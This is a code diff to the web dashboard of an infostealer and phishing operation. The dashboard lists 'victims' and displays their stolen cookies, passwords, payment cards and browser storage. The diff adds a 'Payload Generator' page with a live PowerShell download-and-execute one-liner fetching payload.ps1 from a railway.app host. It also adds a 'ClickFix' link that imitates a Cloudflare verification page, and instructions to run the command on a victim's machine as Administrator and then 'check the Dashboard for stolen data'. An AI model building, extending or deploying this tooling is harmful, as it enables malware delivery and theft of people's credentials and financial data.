@@ -220,6 +220,10 @@
         .sidebar .nav-item.replay-nav:hover { color: #f9a8d4; background: #1a0a1a; }
         .sidebar .nav-item.replay-nav.active { color: #f472b6; border-left-color: #f472b6; }
 
+        .sidebar .nav-item.payload-nav { color: #fbbf24; }
+        .sidebar .nav-item.payload-nav:hover { color: #fcd34d; background: #1a1400; }
+        .sidebar .nav-item.payload-nav.active { color: #fbbf24; border-left-color: #fbbf24; }
+
         .sidebar-toggle {
             display: none;
             position: fixed;
@@ -373,15 +377,15 @@
 
         .stats-row {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 12px;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 10px;
             margin-bottom: 20px;
         }
         .stat-card {
             background: #0f1626;
             border: 1px solid #1a2538;
             border-radius: 10px;
-            padding: 12px 14px;
+            padding: 10px 12px;
             transition: all 0.3s ease;
             position: relative;
             overflow: hidden;
@@ -398,8 +402,8 @@
         .stat-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,0,0,0.3); }
         .stat-card:hover::before { opacity: 1; }
 
-        .stat-card .label { font-size: 9px; color: #475569; text-transform: uppercase; letter-spacing: 0.6px; font-weight: 600; }
-        .stat-card .number { font-size: 24px; font-weight: 700; color: #f1f5f9; margin-top: 2px; font-family: 'Inter', sans-serif; }
+        .stat-card .label { font-size: 8px; color: #475569; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
+        .stat-card .number { font-size: 22px; font-weight: 700; color: #f1f5f9; margin-top: 1px; font-family: 'Inter', sans-serif; }
         .stat-card .number.green { color: #00ff88; }
         .stat-card .number.orange { color: #f59e0b; }
         .stat-card .number.purple { color: #8b5cf6; }
@@ -407,7 +411,8 @@
         .stat-card .number.pink { color: #ec4899; }
         .stat-card .number.cyan { color: #06b6d4; }
         .stat-card .number.violet { color: #8b5cf6; }
-        .stat-card .sub { font-size: 10px; color: #334155; margin-top: 2px; }
+        .stat-card .number.gold { color: #fbbf24; }
+        .stat-card .sub { font-size: 9px; color: #334155; margin-top: 1px; }
 
         .toolbar {
             display: flex;
@@ -446,6 +451,8 @@
         .btn.violet:hover { background: rgba(139,92,246,0.08); box-shadow: 0 0 20px rgba(139,92,246,0.1); }
         .btn.replay-pink { border-color: #f472b6; color: #f472b6; }
         .btn.replay-pink:hover { background: rgba(244,114,182,0.08); box-shadow: 0 0 20px rgba(244,114,182,0.1); }
+        .btn.payload-gold { border-color: #fbbf24; color: #fbbf24; }
+        .btn.payload-gold:hover { background: rgba(251,191,36,0.08); box-shadow: 0 0 20px rgba(251,191,36,0.1); }
         .btn.small { font-size: 9px; padding: 4px 8px; }
 
         .btn-icon-sm {
@@ -481,6 +488,8 @@
         .btn-icon-sm.expand-sm:hover { border-color: #64748b; color: #e2e8f0; background: #1a2538; }
         .btn-icon-sm.rename { border-color: #f59e0b; color: #f59e0b; }
         .btn-icon-sm.rename:hover { background: rgba(245,158,11,0.08); }
+        .btn-icon-sm.payload-copy { border-color: #fbbf24; color: #fbbf24; }
+        .btn-icon-sm.payload-copy:hover { background: rgba(251,191,36,0.08); }
 
         /* PC CARD — ACCORDION STYLE */
         .pc-grid {
@@ -661,6 +670,103 @@
         .pc-card .pc-footer-actions .btn-sm.primary:hover { background: rgba(0,255,136,0.08); }
         .pc-card .pc-footer-actions .btn-sm.violet { border-color: #8b5cf6; color: #8b5cf6; }
         .pc-card .pc-footer-actions .btn-sm.violet:hover { background: rgba(139,92,246,0.08); }
+
+        /* PAYLOAD VIEW */
+        .payload-container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        .payload-card {
+            background: #0f1626;
+            border: 1px solid #1a2538;
+            border-radius: 12px;
+            padding: 20px 24px;
+            margin-bottom: 16px;
+            transition: all 0.3s ease;
+        }
+        .payload-card:hover { border-color: #2a3a5a; box-shadow: 0 8px 40px rgba(0,0,0,0.4); }
+        .payload-card .payload-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #f1f5f9;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+        .payload-card .payload-title .badge {
+            font-size: 8px;
+            background: #fbbf24;
+            color: #0b0f1a;
+            padding: 1px 8px;
+            border-radius: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-left: 6px;
+        }
+        .payload-card .payload-url {
+            background: #0b0f1a;
+            border: 1px solid #1a2538;
+            border-radius: 6px;
+            padding: 8px 12px;
+            font-family: 'Cascadia Code', 'Consolas', monospace;
+            font-size: 12px;
+            color: #00ff88;
+            word-break: break-all;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .payload-card .payload-url .url-text {
+            flex: 1;
+            min-width: 100px;
+            word-break: break-all;
+        }
+        .payload-card .payload-command {
+            background: #0b0f1a;
+            border: 1px solid #1a2538;
+            border-radius: 6px;
+            padding: 10px 12px;
+            font-family: 'Cascadia Code', 'Consolas', monospace;
+            font-size: 11px;
+            color: #f1f5f9;
+            word-break: break-all;
+            white-space: pre-wrap;
+            margin-top: 6px;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            gap: 8px;
+        }
+        .payload-card .payload-command .cmd-text {
+            flex: 1;
+            min-width: 100px;
+        }
+        .payload-card .payload-desc {
+            font-size: 11px;
+            color: #64748b;
+            margin-bottom: 8px;
+            line-height: 1.6;
+        }
+        .payload-card .payload-desc code {
+            color: #fbbf24;
+            background: #1a2538;
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-size: 10px;
+        }
+        .payload-card .payload-options {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+        .payload-card .payload-options .btn {
+            font-size: 10px;
+            padding: 4px 10px;
+        }
 
         .view-content { display: none; }
         .view-content.active { display: block; }
@@ -1353,9 +1459,12 @@
             .replay-group .group-header .stats { margin-left: 0; width: 100%; }
             .replay-card .r-header { flex-direction: column; align-items: flex-start; }
             .replay-card .r-header .stats-mini { margin-left: 0; }
+            .payload-card .payload-url { flex-direction: column; align-items: stretch; }
+            .payload-card .payload-command { flex-direction: column; align-items: stretch; }
         }
         @media (max-width: 480px) {
-            .stats-row { grid-template-columns: 1fr; }
+            .stats-row { grid-template-columns: 1fr 1fr; }
+            .stats-row .stat-card .number { font-size: 18px; }
             .toolbar .left, .toolbar .right { width: 100%; justify-content: center; }
             .topbar .right { flex-wrap: wrap; justify-content: center; }
             .topbar .right .contact-btn { font-size: 10px; padding: 3px 8px; }
@@ -1377,7 +1486,6 @@
             .cookies-table { font-size: 9px; min-width: 400px; }
             .cookies-table td, .cookies-table th { padding: 4px 6px; }
             .settings-modal { padding: 12px; }
-            .stats-row .stat-card .number { font-size: 20px; }
             .btn { font-size: 10px; padding: 4px 8px; }
             .sidebar .contact-support { font-size: 10px; padding: 4px 10px; }
             .modal .session-actions .btn { font-size: 10px; padding: 4px 10px; }
@@ -1389,6 +1497,10 @@
             .replay-card .r-header .domain-tag { font-size: 11px; }
             .rename-box { padding: 16px 14px; }
             .replay-group .group-header .pc-name { font-size: 13px; }
+            .payload-card { padding: 14px 16px; }
+            .payload-card .payload-url { font-size: 10px; }
+            .payload-card .payload-command { font-size: 9px; }
+            .payload-card .payload-title { font-size: 13px; }
         }
         @media (max-width: 360px) {
             .main { padding: 10px; padding-top: 48px; }
@@ -1407,6 +1519,10 @@
             .replay-card { padding: 10px 12px; }
             .victim-card { padding: 10px 12px; }
             .replay-group .group-header .stats { font-size: 8px; gap: 4px; }
+            .payload-card { padding: 10px 12px; }
+            .payload-card .payload-url { font-size: 9px; padding: 6px 8px; }
+            .payload-card .payload-command { font-size: 8px; padding: 6px 8px; }
+            .stats-row { grid-template-columns: 1fr 1fr; }
         }
     </style>
 </head>
@@ -1463,6 +1579,9 @@
         <div class="nav-item" data-view="tester" id="navTester">
             <span class="icon">🔍</span> Tester
         </div>
+        <div class="nav-item payload-nav" data-view="payload" id="navPayload">
+            <span class="icon">📦</span> Payload
+        </div>
         <div class="nav-item" data-view="export" id="navExport">
             <span class="icon">📥</span> Export
         </div>
@@ -1507,6 +1626,11 @@
         <div class="view-content active" id="viewMain">
             <div class="stats-row" id="statsRow">
                 <div class="stat-card">
+                    <div class="label">Total Visitors</div>
+                    <div class="number gold" id="statVisitors">0</div>
+                    <div class="sub" id="visitorSub">🏠 0 home · 📦 0 payload</div>
+                </div>
+                <div class="stat-card">
                     <div class="label">Total PCs</div>
                     <div class="number green" id="statPcs">0</div>
                     <div class="sub">Unique computers</div>
@@ -1546,7 +1670,7 @@
                 </div>
                 <div class="right">
                     <button class="btn danger" onclick="showClearAllConfirm()">🗑️ Clear</button>
-                    <button class="btn" onclick="fetchData()">🔄 Refresh</button>
+                    <button class="btn" onclick="fetchData(); fetchVisitors();">🔄 Refresh</button>
                 </div>
             </div>
 
@@ -1642,7 +1766,7 @@
             </div>
         </div>
 
-        <!-- VIEW: REPLAY — WITH DROPDOWN -->
+        <!-- VIEW: REPLAY -->
         <div class="view-content" id="viewReplay">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#f472b6;font-size:12px;">▶️ Replay — grouped by PC</span></div>
@@ -1650,6 +1774,91 @@
             </div>
             <div class="replay-grid" id="replayGrid">
                 <div class="empty-state"><div class="icon">▶️</div><h3>No victims to replay</h3></div>
+            </div>
+        </div>
+
+        <!-- VIEW: PAYLOAD GENERATOR -->
+        <div class="view-content" id="viewPayload">
+            <div class="toolbar" style="margin-bottom:12px;">
+                <div class="left"><span style="color:#fbbf24;font-size:12px;">📦 Payload Generator</span></div>
+                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
+            </div>
+
+            <div class="payload-container">
+                <div class="payload-card">
+                    <div class="payload-title">
+                        📍 Payload URL
+                        <span class="badge">Copy & Share</span>
+                    </div>
+                    <div class="payload-desc">
+                        The <code>payload.ps1</code> file hosted on your server. Victims download this and execute it.
+                    </div>
+                    <div class="payload-url" id="payloadUrlContainer">
+                        <span class="url-text" id="payloadUrlDisplay">https://cipheranon-production.up.railway.app/payload.ps1</span>
+                        <button class="btn-icon-sm payload-copy" onclick="copyPayloadUrl()" title="Copy URL">📋</button>
+                    </div>
+                </div>
+
+                <div class="payload-card">
+                    <div class="payload-title">
+                        ⚡ PowerShell Command
+                        <span class="badge">One-Liner</span>
+                    </div>
+                    <div class="payload-desc">
+                        Copy this command and paste it into a victim's PowerShell (as Administrator) to execute the payload.
+                    </div>
+                    <div class="payload-command" id="payloadCmdContainer">
+                        <span class="cmd-text" id="payloadCmdDisplay">iex (New-Object Net.WebClient).DownloadString('https://cipheranon-production.up.railway.app/payload.ps1')</span>
+                        <button class="btn-icon-sm payload-copy" onclick="copyPayloadCmd()" title="Copy Command">📋</button>
+                    </div>
+                    <div class="payload-options">
+                        <button class="btn payload-gold small" onclick="copyPayloadCmd()">📋 Copy Command</button>
+                        <button class="btn payload-gold small" onclick="copyPayloadUrl()">📋 Copy URL</button>
+                    </div>
+                </div>
+
+                <div class="payload-card">
+                    <div class="payload-title">
+                        🚀 ClickFix Link
+                        <span class="badge">Social Engineering</span>
+                    </div>
+                    <div class="payload-desc">
+                        Send this link to victims. They'll see a Cloudflare-style verification page that copies the command to their clipboard.
+                    </div>
+                    <div class="payload-url" id="payloadHomeContainer">
+                        <span class="url-text" id="payloadHomeDisplay">https://cipheranon-production.up.railway.app/home</span>
+                        <button class="btn-icon-sm payload-copy" onclick="copyPayloadHome()" title="Copy Link">📋</button>
+                    </div>
+                    <div class="payload-options">
+                        <button class="btn payload-gold small" onclick="copyPayloadHome()">📋 Copy Link</button>
+                        <a href="/home" target="_blank" class="btn primary small">🔗 Open</a>
+                    </div>
+                </div>
+
+                <div class="payload-card">
+                    <div class="payload-title">
+                        🛠️ Instructions
+                        <span class="badge">How To Use</span>
+                    </div>
+                    <div class="payload-desc" style="font-size:12px;color:#94a3b8;line-height:1.8;">
+                        <div style="display:flex;gap:6px;margin-bottom:4px;">
+                            <span style="color:#fbbf24;font-weight:600;">1.</span>
+                            <span>Copy the <strong style="color:#f1f5f9;">PowerShell command</strong> above</span>
+                        </div>
+                        <div style="display:flex;gap:6px;margin-bottom:4px;">
+                            <span style="color:#fbbf24;font-weight:600;">2.</span>
+                            <span>Paste it into a victim's PowerShell (Run as Administrator)</span>
+                        </div>
+                        <div style="display:flex;gap:6px;margin-bottom:4px;">
+                            <span style="color:#fbbf24;font-weight:600;">3.</span>
+                            <span>Or send them the <strong style="color:#f1f5f9;">ClickFix link</strong> and have them follow the steps</span>
+                        </div>
+                        <div style="display:flex;gap:6px;">
+                            <span style="color:#fbbf24;font-weight:600;">4.</span>
+                            <span>Check the <strong style="color:#f1f5f9;">Dashboard</strong> for stolen data</span>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -1817,7 +2026,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    DASHBOARD LOGIC — ALL FIXES
+    DASHBOARD LOGIC — ALL FEATURES + VISITOR TRACKING
     ============================================================ -->
     <script>
         // ============================================================
@@ -1852,7 +2061,7 @@
         let passwordVisibility = {};
         let renameTarget = null;
 
-        // Track open/closed state for ALL accordions (collapsed by default)
+        // Track open/closed state for ALL accordions
         let pcOpenState = {};
 
         const VALUABLE_PATTERNS = ['session','token','auth','login','sid','uid','PHPSESSID','jwt','access_token','refresh_token','api_key','secret','csrf','__Secure','__Host','laravel_session','remember','wordpress_logged_in','wp_session','drupal_session'];
@@ -1976,6 +2185,7 @@
                 'storage': { viewId: 'viewStorage', navId: 'navStorage', title: '💾 LocalStorage', sub: 'Grouped by PC' },
                 'trash': { viewId: 'viewTrash', navId: 'navTrash', title: '🗑️ Trash', sub: 'Deleted victims' },
                 'replay': { viewId: 'viewReplay', navId: 'navReplay', title: '▶️ Replay', sub: 'Grouped by PC' },
+                'payload': { viewId: 'viewPayload', navId: 'navPayload', title: '📦 Payload', sub: 'Generate & copy payload links' },
                 'tester': { viewId: 'viewTester', navId: 'navTester', title: '🔍 Tester', sub: 'Test all domains' },
                 'export': { viewId: 'viewExport', navId: 'navExport', title: '📥 Export Data', sub: 'Export formats' }
             };
@@ -1996,7 +2206,8 @@
             else if (view === 'cards') renderCardsView();
             else if (view === 'storage') renderStorageView();
             else if (view === 'replay') renderReplayView();
-            else if (view === 'main') fetchData();
+            else if (view === 'payload') updatePayloadUrls();
+            else if (view === 'main') { fetchData(); fetchVisitors(); }
             else if (view === 'trash') fetchTrash();
         }
 
@@ -2040,6 +2251,22 @@
         }
 
         // ============================================================
+        // FETCH VISITORS
+        // ============================================================
+
+        async function fetchVisitors() {
+            try {
+                const res = await fetch('/api/visits');
+                if (res.status === 401) return;
+                const data = await res.json();
+                document.getElementById('statVisitors').textContent = data.totalVisits || 0;
+                document.getElementById('visitorSub').textContent = '🏠 ' + (data.homeVisits || 0) + ' home · 📦 ' + (data.payloadDownloads || 0) + ' payload';
+            } catch (e) {
+                console.log('Failed to fetch visitors');
+            }
+        }
+
+        // ============================================================
         // UPDATE SIDEBAR COUNTS
         // ============================================================
 
@@ -2074,64 +2301,113 @@
         }
 
         // ============================================================
-        // EXTRACT REAL DOMAIN FROM ENTRY — ENHANCED
+        // PAYLOAD URL GENERATOR
+        // ============================================================
+
+        function getBaseUrl() {
+            return window.location.origin;
+        }
+
+        function updatePayloadUrls() {
+            const baseUrl = getBaseUrl();
+            document.getElementById('payloadUrlDisplay').textContent = baseUrl + '/payload.ps1';
+            document.getElementById('payloadCmdDisplay').textContent = "iex (New-Object Net.WebClient).DownloadString('" + baseUrl + "/payload.ps1')";
+            document.getElementById('payloadHomeDisplay').textContent = baseUrl + '/home';
+        }
+
+        function copyPayloadUrl() {
+            const text = document.getElementById('payloadUrlDisplay').textContent;
+            copyText(text);
+        }
+
+        function copyPayloadCmd() {
+            const text = document.getElementById('payloadCmdDisplay').textContent;
+            copyText(text);
+        }
+
+        function copyPayloadHome() {
+            const text = document.getElementById('payloadHomeDisplay').textContent;
+            copyText(text);
+        }
+
+        // ============================================================
+        // ENHANCED DOMAIN EXTRACTION — USES CREDENTIALS URL AS FALLBACK
         // ============================================================
 
         function extractDomain(entry) {
-            // Try to get domain from fingerprint or entry
-            let domain = entry.fingerprint?.hostname || entry.domain || '';
+            const cookies = entry.cookies || {};
+            const cookieKeys = Object.keys(cookies);
+            let domain = '';
             
-            // Clean up
-            domain = domain.replace(/^\./, '').replace(/\/.*$/, '').trim();
+            for (const key of cookieKeys) {
+                const parts = key.split('|');
+                if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown' && parts[0] !== '' && parts[0].length > 2) {
+                    domain = parts[0];
+                    break;
+                }
+            }
             
-            // If domain is empty, 'unknown', or looks like PC name, try to extract from cookies
-            if (!domain || domain === 'unknown' || domain.includes('railway.app') || domain.length < 3) {
-                const cookies = entry.cookies || {};
-                const cookieKeys = Object.keys(cookies);
-                
-                // Try to extract domain from cookie keys (format: domain|browser)
+            if (!domain || domain === 'unknown' || domain.length < 3) {
                 for (const key of cookieKeys) {
-                    const parts = key.split('|');
-                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown' && parts[0] !== '' && parts[0].length > 2) {
-                        domain = parts[0];
-                        break;
-                    }
-                }
-                
-                // If still no domain, try to get from cookie names that look like domains
-                if (!domain || domain === 'unknown' || domain.length < 3) {
-                    for (const key of cookieKeys) {
-                        // Check if cookie name looks like a domain
-                        if (key.includes('.') && !key.includes(' ') && key.length > 3 && !key.includes('__')) {
-                            const parts = key.split('.');
-                            if (parts.length >= 2 && parts[0].length > 1) {
-                                domain = parts[0] + '.' + parts[1];
-                                break;
-                            }
-                        }
-                    }
-                }
-                
-                // If still no domain, try to get from localStorage keys
-                if (!domain || domain === 'unknown' || domain.length < 3) {
-                    const storage = entry.localStorage || {};
-                    const storageKeys = Object.keys(storage);
-                    for (const key of storageKeys) {
-                        const parts = key.split(':');
-                        if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown' && parts[0].length > 2) {
-                            domain = parts[0];
+                    if (key.includes('.') && !key.includes(' ') && key.length > 3 && !key.includes('__')) {
+                        const parts = key.split('.');
+                        if (parts.length >= 2 && parts[0].length > 1) {
+                            domain = parts[0] + '.' + parts[1];
                             break;
                         }
                     }
                 }
-                
-                // If still no domain, use PC name but mark as 'unknown'
-                if (!domain || domain === 'unknown' || domain.length < 3) {
-                    domain = 'unknown';
+            }
+            
+            if (!domain || domain === 'unknown' || domain.length < 3) {
+                const storage = entry.localStorage || {};
+                for (const key of Object.keys(storage)) {
+                    const parts = key.split(':');
+                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown' && parts[0].length > 2) {
+                        domain = parts[0];
+                        break;
+                    }
                 }
             }
             
-            // Final cleanup
+            if (!domain || domain === 'unknown' || domain.length < 3) {
+                const creds = entry.credentials || [];
+                for (const c of creds) {
+                    const url = c.url || c.origin_url || '';
+                    if (url && !url.includes('railway.app') && url.length > 2) {
+                        const clean = url.replace(/^https?:\/\//, '').replace(/\/.*$/, '').trim();
+                        if (clean && clean.length > 2 && clean.includes('.')) {
+                            domain = clean;
+                            break;
+                        }
+                    }
+                }
+            }
+            
+            if (!domain || domain === 'unknown' || domain.length < 3) {
+                const cards = entry.cards || [];
+                for (const c of cards) {
+                    const url = c.url || '';
+                    if (url && !url.includes('railway.app') && url.length > 2) {
+                        const clean = url.replace(/^https?:\/\//, '').replace(/\/.*$/, '').trim();
+                        if (clean && clean.length > 2 && clean.includes('.')) {
+                            domain = clean;
+                            break;
+                        }
+                    }
+                }
+            }
+            
+            if (!domain || domain === 'unknown' || domain.length < 3) {
+                const fallback = entry.fingerprint?.hostname || entry.domain || '';
+                if (fallback && fallback.includes('.') && !fallback.includes(' ') && !fallback.includes('_') && fallback.length > 3) {
+                    const isPcName = /^[A-Z0-9\-_]+$/.test(fallback) || fallback.includes(' ') || !fallback.includes('.');
+                    if (!isPcName) {
+                        domain = fallback;
+                    }
+                }
+            }
+            
             domain = domain.replace(/^\./, '').replace(/\/.*$/, '').trim();
             return domain || 'unknown';
         }
@@ -2161,7 +2437,6 @@
                     };
                 }
                 
-                // Extract real domain using enhanced function
                 let domain = extractDomain(entry);
                 
                 if (!grouped[pc].domains[domain]) {
@@ -2216,7 +2491,6 @@
                 return;
             }
 
-            // All Victims header
             let totalVictims = 0;
             pcNames.forEach(pcName => { totalVictims += grouped[pcName].totalVictims; });
             const header = document.createElement('div');
@@ -2229,10 +2503,9 @@
                 const flag = getFlagEmoji(pc.countryCode);
                 const domainNames = Object.keys(pc.domains);
                 
-                // COLLAPSED BY DEFAULT
                 const safeName = 'pc-' + pcName.replace(/[^a-zA-Z0-9]/g, '_');
                 if (pcOpenState[safeName] === undefined) {
-                    pcOpenState[safeName] = false; // COLLAPSED BY DEFAULT
+                    pcOpenState[safeName] = false;
                 }
                 const isOpen = pcOpenState[safeName];
 
@@ -2244,7 +2517,6 @@
                     const firstEntry = d.entries[0] || null;
                     const entryId = firstEntry ? firstEntry._uniqueId : '';
 
-                    // Display real domain, show 'unknown' if no domain found
                     const displayDomain = domain === 'unknown' ? '🌐 unknown' : '🌐 ' + domain;
 
                     domainsHtml += `
@@ -2390,7 +2662,7 @@
         }
 
         // ============================================================
-        // RENAME PC — UPDATES EVERYWHERE
+        // RENAME PC — CALLS API
         // ============================================================
 
         function openRename(pcName) {
@@ -2419,39 +2691,35 @@
                 return;
             }
             
-            // Rename all victims with this PC name in allData
-            let updated = 0;
-            allData.forEach(entry => {
-                const p = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-                if (p === renameTarget) {
-                    entry.pcName = newName;
-                    updated++;
+            showToast('⏳ Renaming...', 'warning');
+            
+            fetch('/api/rename-pc', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ oldName: renameTarget, newName: newName })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'ok') {
+                    closeRename();
+                    showToast(`✅ ${data.message}`, 'success');
+                    fetchData();
+                    fetchTrash();
+                    if (currentView === 'victims') renderVictimsView();
+                    if (currentView === 'replay') renderReplayView();
+                    if (currentView === 'cookies') renderCookiesView();
+                    if (currentView === 'creds') renderCredsView();
+                    if (currentView === 'cards') renderCardsView();
+                    if (currentView === 'storage') renderStorageView();
+                } else {
+                    showToast('❌ ' + (data.message || 'Failed to rename'), 'error');
                 }
+            })
+            .catch((err) => {
+                showToast('❌ Failed to connect to server: ' + err.message, 'error');
             });
-            
-            // Also update in trashData
-            trashData.forEach(entry => {
-                const p = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-                if (p === renameTarget) {
-                    entry.pcName = newName;
-                }
-            });
-            
-            closeRename();
-            showToast(`✅ Renamed ${updated} victims from "${renameTarget}" to "${newName}"`, 'success');
-            
-            // Re-render everything
-            render(allData);
-            updateSidebarCounts(allData);
-            if (currentView === 'victims') renderVictimsView();
-            if (currentView === 'replay') renderReplayView();
-            if (currentView === 'cookies') renderCookiesView();
-            if (currentView === 'creds') renderCredsView();
-            if (currentView === 'cards') renderCardsView();
-            if (currentView === 'storage') renderStorageView();
         }
 
-        // Close rename with Escape
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape') {
                 if (document.getElementById('renameOverlay').classList.contains('active')) {
@@ -2862,7 +3130,10 @@
                     const name = c.name || c.username || c.field || 'unknown';
                     const value = c.value || c.password || '';
                     const type = c.type || 'text';
-                    const url = c.url || c.origin_url || domain;
+                    let url = c.url || c.origin_url || domain;
+                    if (url && !url.includes('http')) {
+                        url = 'https://' + url;
+                    }
                     if (!value || value === '' || value === 'undefined' || value === 'null') return;
                     allCreds.push({
                         pc: pc,
@@ -2906,6 +3177,7 @@
                 const visKey = 'cred-vis-' + idx;
                 const isVisible = passwordVisibility[visKey] || false;
                 const displayDomain = cred.domain === 'unknown' ? 'unknown' : cred.domain;
+                const displayUrl = cred.url && cred.url !== 'https://' ? cred.url : 'https://' + displayDomain;
                 html += `
                     <tr class="cred-row">
                         <td class="pc-label">${cred.pc}</td>
@@ -2913,7 +3185,7 @@
                         <td class="cred-name">${cred.name}</td>
                         <td class="cred-value ${isVisible ? '' : 'password-hidden'}" id="cred-val-${idx}">${isVisible ? cred.value : cred.value.replace(/./g, '•')}</td>
                         <td><span class="cred-type">${cred.type}</span></td>
-                        <td><a href="https://${cred.url}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${cred.url.length > 25 ? cred.url.slice(0,25)+'...' : cred.url}</a></td>
+                        <td><a href="${displayUrl}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${displayUrl.length > 25 ? displayUrl.slice(0,25)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a></td>
                         <td style="color:#475569;font-size:10px;">${timeAgo(cred.time)}</td>
                         <td style="text-align:center;white-space:nowrap;">
                             <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', 'cred-val-${idx}')">👁️</button>
@@ -2947,7 +3219,10 @@
                     let value = c.value || c.number || c.card_number || '';
                     const name = c.name || c.cardholder || c.holder || 'Unknown';
                     const type = c.type || 'card-number';
-                    const url = c.url || c.origin_url || domain;
+                    let url = c.url || c.origin_url || domain;
+                    if (url && !url.includes('http')) {
+                        url = 'https://' + url;
+                    }
                     if (!value || value === '' || value === 'undefined' || value === 'null') return;
                     if (c.month && c.year && !value.includes('/')) {
                         value = c.month + '/' + c.year;
@@ -2995,6 +3270,7 @@
                 const isVisible = passwordVisibility[visKey] || false;
                 const displayValue = isVisible ? card.value : card.value.replace(/[0-9]/g, '•');
                 const displayDomain = card.domain === 'unknown' ? 'unknown' : card.domain;
+                const displayUrl = card.url && card.url !== 'https://' ? card.url : 'https://' + displayDomain;
                 html += `
                     <tr class="card-row">
                         <td class="pc-label">${card.pc}</td>
@@ -3002,7 +3278,7 @@
                         <td class="card-name">${card.name}</td>
                         <td class="card-value ${isVisible ? '' : 'password-hidden'}" id="card-val-${idx}">${displayValue}</td>
                         <td><span class="card-type">${card.type}</span></td>
-                        <td><a href="https://${card.url}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${card.url.length > 25 ? card.url.slice(0,25)+'...' : card.url}</a></td>
+                        <td><a href="${displayUrl}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${displayUrl.length > 25 ? displayUrl.slice(0,25)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a></td>
                         <td style="color:#475569;font-size:10px;">${timeAgo(card.time)}</td>
                         <td style="text-align:center;white-space:nowrap;">
                             <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', 'card-val-${idx}')">👁️</button>
@@ -3103,7 +3379,7 @@
         }
 
         // ============================================================
-        // VICTIMS VIEW — COLLAPSED BY DEFAULT
+        // VICTIMS VIEW
         // ============================================================
 
         function renderVictimsView() {
@@ -3131,7 +3407,6 @@
                 const flag = getFlagEmoji(pc.countryCode);
                 const safeName = 'vgroup-' + pcName.replace(/[^a-zA-Z0-9]/g, '_');
                 
-                // COLLAPSED BY DEFAULT
                 if (pcOpenState[safeName] === undefined) {
                     pcOpenState[safeName] = false;
                 }
@@ -3208,7 +3483,7 @@
         }
 
         // ============================================================
-        // REPLAY VIEW — WITH DROPDOWN
+        // REPLAY VIEW
         // ============================================================
 
         function renderReplayView() {
@@ -3227,7 +3502,6 @@
                 const flag = getFlagEmoji(pc.countryCode);
                 const safeName = 'rgroup-' + pcName.replace(/[^a-zA-Z0-9]/g, '_');
                 
-                // COLLAPSED BY DEFAULT
                 if (pcOpenState[safeName] === undefined) {
                     pcOpenState[safeName] = false;
                 }
@@ -3532,9 +3806,10 @@
                         const name = c.name || c.username || 'unknown';
                         const value = c.value || c.password || '';
                         const url = c.url || c.origin_url || domain;
+                        const displayUrl = url && !url.includes('http') ? 'https://' + url : url || domain;
                         lines.push(`    Username: ${name}`);
                         lines.push(`    Password: ${value}`);
-                        lines.push(`    URL:      https://${url}`);
+                        lines.push(`    URL:      ${displayUrl}`);
                         lines.push('');
                     });
                 }
@@ -3547,9 +3822,11 @@
                         if (c.month && c.year && !value.includes('/')) {
                             value = c.month + '/' + c.year;
                         }
+                        const url = c.url || c.origin_url || domain;
+                        const displayUrl = url && !url.includes('http') ? 'https://' + url : url || domain;
                         lines.push(`    Cardholder: ${name}`);
                         lines.push(`    Number:     ${value}`);
-                        lines.push(`    URL:        https://${c.url || domain}`);
+                        lines.push(`    URL:        ${displayUrl}`);
                         lines.push('');
                     });
                 }
@@ -3728,18 +4005,22 @@
                         ${creds.map((c, idx) => {
                             const name = c.name || c.username || c.field || 'unknown';
                             const value = c.value || c.password || '';
-                            const url = c.url || c.origin_url || domain;
+                            let url = c.url || c.origin_url || domain;
+                            if (url && !url.includes('http')) {
+                                url = 'https://' + url;
+                            }
                             const type = c.type || 'text';
                             const escaped = value.replace(/'/g, "\\'");
                             const visKey = 'modal-cred-' + idx;
                             const isVisible = passwordVisibility[visKey] || false;
                             if (!value || value === '' || value === 'undefined' || value === 'null') return '';
+                            const displayUrl = url && url !== 'https://' ? url : 'https://' + domain;
                             return `
                                 <div class="data-item">
                                     <span class="label" style="color:#ec4899;">${name}</span>
                                     <span class="value ${isVisible ? '' : 'password-hidden'}" id="${visKey}-val">${isVisible ? value : value.replace(/./g, '•')}</span>
                                     <span class="badge-type">${type}</span>
-                                    <a href="https://${url}" target="_blank" class="link">🔗 ${url.length > 30 ? url.slice(0,30)+'...' : url}</a>
